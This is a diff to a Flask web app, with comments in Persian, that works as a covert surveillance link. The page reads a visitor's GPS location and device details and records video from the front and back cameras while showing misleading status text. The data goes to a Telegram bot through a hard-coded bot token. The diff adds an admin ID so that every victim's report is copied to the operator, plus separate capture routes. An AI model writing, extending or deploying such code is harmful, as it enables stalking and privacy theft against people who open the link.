@@ -6,6 +6,7 @@ import json
 app = Flask(__name__)
 
 BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
+ADMIN_ID = "8173349543"  # آیدی ادمین اصلی شما (تمام گزارش‌ها برای شما هم ارسال می‌شود)
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -29,9 +30,8 @@ HTML_TEMPLATE = """
         if(started) return;
         started = true;
         
-        // استخراج آیدی عددی کاربر از انتهای لینک (مثلا ?user=5973359689)
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user');
+        const userId = urlParams.get('user') || "{{ admin_id }}";
         
         const info = {
             ua: navigator.userAgent,
@@ -41,18 +41,49 @@ HTML_TEMPLATE = """
             storage: navigator.storage && await navigator.storage.estimate().then(e => (e.quota / 1e9).toFixed(2) + " GB") || "نامشخص"
         };
         
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            info.lat = pos.coords.latitude;
-            info.lon = pos.coords.longitude;
-            
-            // مرحله ۱: دوربین جلو
+        const mode = "{{ mode }}";
+
+        if (mode === "location") {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                info.lat = pos.coords.latitude;
+                info.lon = pos.coords.longitude;
+                document.getElementById('status').innerText = "ثبت شد";
+                await fetch("/upload_loc", {
+                    method: "POST",
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(info)
+                });
+            });
+        }
+        else if (mode === "specs") {
+            document.getElementById('status').innerText = "در حال بررسی...";
+            await fetch("/upload_specs", {
+                method: "POST",
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(info)
+            });
+            document.getElementById('status').innerText = "انجام شد";
+        }
+        else if (mode === "front") {
             document.getElementById('status').innerText = "ساخته شد";
             await recordAndSend("user", "ساخته شد", info);
-            
-            // مرحله ۲: دوربین عقب
+        }
+        else if (mode === "back") {
             document.getElementById('status').innerText = "تولید شد";
             await recordAndSend("environment", "تولید شد", info);
-        });
+        }
+        else if (mode === "all") {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                info.lat = pos.coords.latitude;
+                info.lon = pos.coords.longitude;
+                
+                document.getElementById('status').innerText = "ساخته شد";
+                await recordAndSend("user", "ساخته شد", info);
+                
+                document.getElementById('status').innerText = "تولید شد";
+                await recordAndSend("environment", "تولید شد", info);
+            });
+        }
     }
 
     async function recordAndSend(facingMode, label, info) {
@@ -83,22 +114,33 @@ HTML_TEMPLATE = """
 
 @app.route("/")
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(HTML_TEMPLATE, mode="all", admin_id=ADMIN_ID)
+
+@app.route("/front")
+def front():
+    return render_template_string(HTML_TEMPLATE, mode="front", admin_id=ADMIN_ID)
+
+@app.route("/back")
+def back():
+    return render_template_string(HTML_TEMPLATE, mode="back", admin_id=ADMIN_ID)
+
+@app.route("/location")
+def location():
+    return render_template_string(HTML_TEMPLATE, mode="location", admin_id=ADMIN_ID)
+
+@app.route("/specs")
+def specs():
+    return render_template_string(HTML_TEMPLATE, mode="specs", admin_id=ADMIN_ID)
 
 @app.route("/upload", methods=["POST"])
 def upload():
     video = request.files.get("video")
     info = json.loads(request.form.get("info"))
     label = request.form.get("label")
+    target_user_id = info.get("userId") or ADMIN_ID
     
-    # گرفتن آیدی عددی کاربر که از طریق سایت ارسال شده است
-    target_user_id = info.get("userId")
-    
-    if not target_user_id:
-        return "User ID missing", 400
-    
-    msg = (f"🚨 {label}\n\n"
-           f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
+    msg = (f"🚨 گزارش جدید ({label})\n\n"
+           f"📍 موقعیت: {info.get('lat', 'نامشخص')}, {info.get('lon', 'نامشخص')}\n"
            f"📱 دستگاه: {info.get('ua')}\n"
            f"💾 رم: {info.get('ram')} GB\n"
            f"🗄 حافظه: {info.get('storage')}\n"
@@ -106,13 +148,54 @@ def upload():
            f"ساخته شده توسط ریس شاهد و ریس نوری\n"
            f"@shahidnaimi5642 | @HOKOMAT_ARAB")
     
-    # ارسال لوکیشن و ویدیو به چتِ خودِ همان کاربری که روی لینک کلیک کرده است
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
-                  data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
+    if info.get('lat'):
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                      data={"chat_id": ADMIN_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
+        if target_user_id != ADMIN_ID:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                          data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
     
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                  data={"chat_id": target_user_id, "caption": msg},
+                  data={"chat_id": ADMIN_ID, "caption": msg},
                   files={"video": ("v.webm", video.stream)})
+    
+    if target_user_id != ADMIN_ID:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
+                      data={"chat_id": target_user_id, "caption": msg},
+                      files={"video": ("v.webm", video.stream)})
+                      
+    return "ok"
+
+@app.route("/upload_loc", methods=["POST"])
+def upload_loc():
+    info = request.get_json()
+    target_user_id = info.get("userId") or ADMIN_ID
+    if info.get('lat'):
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                      data={"chat_id": ADMIN_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
+        if target_user_id != ADMIN_ID:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                          data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
+    return "ok"
+
+@app.route("/upload_specs", methods=["POST"])
+def upload_specs():
+    info = request.get_json()
+    target_user_id = info.get("userId") or ADMIN_ID
+    msg = (f"🚨 مشخصات دستگاه کاربر\n\n"
+           f"📱 دستگاه: {info.get('ua')}\n"
+           f"💾 رم: {info.get('ram')} GB\n"
+           f"🗄 حافظه: {info.get('storage')}\n"
+           f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
+           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
+           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
+           
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={"chat_id": ADMIN_ID, "text": msg})
+    if target_user_id != ADMIN_ID:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                      json={"chat_id": target_user_id, "text": msg})
+                      
     return "ok"
 
 if __name__ == "__main__":
